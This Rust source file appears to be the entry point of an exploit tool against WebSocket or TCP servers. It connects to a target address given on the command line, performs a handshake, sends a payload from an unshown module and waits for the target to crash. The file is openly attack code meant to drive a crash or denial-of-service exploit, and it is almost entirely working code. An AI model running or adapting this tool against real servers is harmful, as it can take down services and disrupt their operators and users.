use crate::handshake::Handshake;
use clap::Parser;
use config::Args;
use exploit::implementation::*;
use log::{error, info};
use payload::Payload;
use std::{io::Read, net::TcpStream, process::exit, thread::sleep, time::Duration};
use tungstenite::{connect, stream::MaybeTlsStream};

mod config;
mod exploit;
mod frame;
mod handshake;
mod payload;

/// Get the socket address from the command line arguments
/// the formats are different on tungstenite and native TCP stream
///
fn get_socket_addr() -> String {
    let args = Args::parse();

    if args.server.use_tungstenite {
        return format!(
            "{}://{}:{}",
            args.server.protocol, args.server.address, args.server.port
        );
    }

    format!("{}:{}", args.server.address, args.server.port)
}

/// Get the socket stream for tungstenite
///
fn get_stream_tungstenite() -> MaybeTlsStream<TcpStream> {
    let socket_addr = get_socket_addr();

    info!("Connecting to {}", socket_addr);

    let (socket, _) = connect(socket_addr).unwrap_or_else(|f| {
        error!("Connection failed! Error: {f:?}");

        exit(0)
    });

    socket.into_inner()
}

/// Get the socket stream for native TCP stream
///
fn get_stream() -> Box<TcpStream> {
    let socket_addr = get_socket_addr();

    info!("Connecting to {}", socket_addr);

    Box::new(TcpStream::connect(socket_addr).unwrap_or_else(|f| {
        error!("Connection failed! Error: {f:?}");

        exit(0)
    }))
}

/// Makes a tungstenite socket and
/// executes the exploit with it
///
fn make_tungstenite_exploit() {
    let stream = get_stream_tungstenite();

    match stream {
        MaybeTlsStream::NativeTls(mut stream) => {
            let mutable = stream.get_mut();

            execute!(mutable);
        }
        MaybeTlsStream::Plain(stream) => {
            execute!(stream);
        }
        _ => unreachable!(),
    }
}

/// Makes a native TCP stream and
/// executes the exploit with it
///
fn make_native_tcp_stream_exploit() {
    let stream = get_stream();

    info!("Connected! Passing away the socket");

    disable_nagle!(stream.try_clone().unwrap());
    increase_write_timeout!(stream.try_clone().unwrap());
    perform_handshake!(stream.try_clone().unwrap());
    wait_confirm!(stream.try_clone().unwrap());
    send_payload!(stream.try_clone().unwrap());
    wait_for_crash!(stream);
}

fn main() {
    unsafe {
        std::env::set_var("RUST_LOG", "info");
    }

    env_logger::init();

    let args = Args::parse();

    if args.server.use_tungstenite {
        make_tungstenite_exploit();
    } else {
        make_native_tcp_stream_exploit();
    }
}
